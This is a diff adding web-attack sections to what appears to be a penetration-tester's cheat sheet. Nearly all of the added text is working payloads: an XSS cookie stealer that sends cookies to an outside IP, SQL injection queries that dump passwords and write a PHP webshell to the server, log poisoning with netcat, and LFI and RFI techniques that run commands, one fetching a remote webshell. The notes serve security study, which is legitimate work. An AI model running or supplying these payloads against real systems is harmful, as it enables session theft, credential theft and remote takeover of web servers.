@@ -37,6 +37,7 @@
 35. [SNMP](#SNMP)
 36. [Buffer Overflow](#Buffer-Overflow)
 36. [Vulnerability Scanning](#Vulnerability-Scanning)
+37. [Web Application Attacks](#Web-Application-Attacks)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
@@ -639,6 +640,11 @@ Basic idea: upload an xml to test if it gets parsed and then abusing the doctype
 :information_source: https://github.com/payloadbox/xss-payload-list
 
 :information_source: https://tryhackme.com/room/learnowaspzap
+
+## Cookie Stealer
+```
+<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
+```
 
 # Wifi Hacking
 
@@ -1285,6 +1291,16 @@ ood
 * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 * https://github.com/payloadbox/sql-injection-payload-list
 
+## Manual Enumeration
+```
+http://10.10.10.10/debug.php?id=1 order by 1 # increase until an error occurs to get number of columns
+
+http://10.10.10.10/debug.php?id=1 union all select 1, 2, 3
+http://10.10.10.10/debug.php?id=1 union all select 1, username, password
+http://10.10.10.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
+http://10.10.10.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+```
+
 ## sqlmap
 * example commands
 ```
@@ -1815,4 +1831,29 @@ sudo /etc/init.d/nessus start
 # http://localhost:8834
 
 ```
+
+# Web Application Attacks
+## Contaminating Log Files
+Perform a trivial request with netcat against a webserver. Even though you will receive a 400 Bad Request, it will still be logged
+```
+[13:00:06]-[manu@kali]-[~/notes] » nc -nv 192.168.175.52 80
+(UNKNOWN) [192.168.175.52] 80 (http) open
+<?php echo shell_exec($_GET['cmd']);?>
+```
+
+## LFI Code Execution
+Given: You contaminated the logs with a webshell payload and the server is running php
+```
+http://10.10.10.10/script.php?file=/var/log/apache2/access.log&cmd=whoami
+
+```
+
+## RFI Code Execution
+```
+# create simple webshell (evil.txt)
+<?php echo shell_exec($_GET['cmd']); ?>
+# request
+http://10.10.10.10/script.php?file=http://10.10.10.11/evil.txt&cmd=ipconfig
+```
+
 
